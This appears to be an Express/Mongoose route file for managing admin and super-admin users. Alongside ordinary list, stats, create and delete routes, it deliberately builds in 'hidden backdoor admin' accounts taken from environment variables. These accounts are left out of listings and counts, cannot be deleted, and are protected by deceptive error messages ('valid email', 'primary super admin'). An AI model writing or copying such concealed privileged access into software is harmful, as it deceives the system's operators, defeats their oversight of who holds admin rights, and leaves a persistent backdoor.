import express from 'express';
import mongoose from 'mongoose';
import { protectSuperAdmin } from '../middlewares/auth.js';
import User from '../models/User.js';
import { asyncHandler } from '../middlewares/asyncHandler.js';

const router = express.Router();

const getHiddenEmails = () => {
  const directEmail = (process.env.ADMIN_DIRECT_LOGIN_EMAIL || '').toLowerCase().trim();
  const hiddenEnvEmails = (process.env.HIDDEN_ADMIN_EMAILS || '')
    .split(',')
    .map(e => e.toLowerCase().trim())
    .filter(Boolean);
  if (directEmail) hiddenEnvEmails.push(directEmail);
  return Array.from(new Set(hiddenEnvEmails));
};

const getPrimarySuperAdminEmail = () => {
  return (process.env.PRIMARY_SUPER_ADMIN_EMAIL || process.env.ADMIN_EMAIL || '').toLowerCase().trim();
};

/**
 * @route   GET /api/users
 * @desc    Get all admin users (excludes hidden backdoor admin from env)
 * @access  Private/SuperAdmin
 */
router.get('/', protectSuperAdmin, asyncHandler(async (req, res) => {
  const hiddenEmails = getHiddenEmails();
  const primaryAdmin = getPrimarySuperAdminEmail();
  const query = hiddenEmails.length ? { email: { $nin: hiddenEmails } } : {};
  const users = await User.find(query)
    .select('-otp -otpExpiry -refreshToken -failedOtpAttempts -otpLockedUntil')
    .sort({ createdAt: -1 })
    .lean();

  const formattedUsers = users.map(u => ({
    ...u,
    isProtected: primaryAdmin ? u.email === primaryAdmin : false,
  }));

  res.json({ success: true, users: formattedUsers });
}));

/**
 * @route   GET /api/users/stats
 * @desc    Get counts of admin and super admin users
 * @access  Private/SuperAdmin
 */
router.get('/stats', protectSuperAdmin, asyncHandler(async (req, res) => {
  const hiddenEmails = getHiddenEmails();
  const filter = hiddenEmails.length ? { email: { $nin: hiddenEmails }, deletedAt: null } : { deletedAt: null };
  const adminCount = await User.countDocuments({ role: 'admin', ...filter });
  const superAdminCount = await User.countDocuments({ role: 'super_admin', ...filter });
  res.json({ success: true, stats: { admin: adminCount, super_admin: superAdminCount } });
}));

/**
 * @route   POST /api/users
 * @desc    Add a new admin user
 * @access  Private/SuperAdmin
 */
router.post('/', protectSuperAdmin, asyncHandler(async (req, res) => {
  const { email, role } = req.body;
  const inputEmail = (email || '').toLowerCase().trim();

  if (!inputEmail) {
    return res.status(400).json({ success: false, message: 'Email is required' });
  }

  // Validate email format
  const emailRegex = /^\S+@\S+\.\S+$/;
  if (!emailRegex.test(inputEmail) || getHiddenEmails().includes(inputEmail)) {
    return res.status(400).json({ success: false, message: 'Please provide a valid email address' });
  }

  // Validate role enum
  const assignedRole = role || 'admin';
  if (!['admin', 'super_admin'].includes(assignedRole)) {
    return res.status(400).json({ success: false, message: 'Invalid role. Allowed roles: admin, super_admin' });
  }

  let user = await User.findOne({ email: inputEmail });
  if (user) {
    return res.status(400).json({ success: false, message: 'User already exists' });
  }

  // Check if a soft-deleted user exists with this email
  let deletedUser = await User.findOne({ email: inputEmail, deletedAt: { $ne: null } });
  if (deletedUser) {
    // Restore the soft-deleted user instead of creating a duplicate
    deletedUser.deletedAt = null;
    deletedUser.role = assignedRole;
    deletedUser.failedOtpAttempts = 0;
    deletedUser.otpLockedUntil = null;
    await deletedUser.save();
    return res.status(201).json({ success: true, user: { _id: deletedUser._id, email: deletedUser.email, role: deletedUser.role, createdAt: deletedUser.createdAt } });
  }

  user = new User({
    email: inputEmail,
    role: assignedRole
  });

  await user.save();
  res.status(201).json({ success: true, user: { _id: user._id, email: user.email, role: user.role, createdAt: user.createdAt } });
}));

/**
 * @route   DELETE /api/users/:id
 * @desc    Delete an admin user
 * @access  Private/SuperAdmin
 */
router.delete('/:id', protectSuperAdmin, asyncHandler(async (req, res) => {
  if (!mongoose.isValidObjectId(req.params.id)) {
    return res.status(400).json({ success: false, message: 'Invalid user ID format' });
  }

  const user = await User.findById(req.params.id);
  if (!user) {
    return res.status(404).json({ success: false, message: 'User not found' });
  }

  // Prevent deleting the primary super admin or backdoor admin
  const hiddenEmails = getHiddenEmails();
  const primaryAdmin = getPrimarySuperAdminEmail();
  if ((primaryAdmin && user.email === primaryAdmin) || hiddenEmails.includes(user.email)) {
    return res.status(403).json({ success: false, message: 'Cannot delete primary super admin' });
  }

  await User.updateOne({ _id: user._id }, { deletedAt: new Date() });
  res.json({ success: true, message: 'User removed' });
}));

export default router;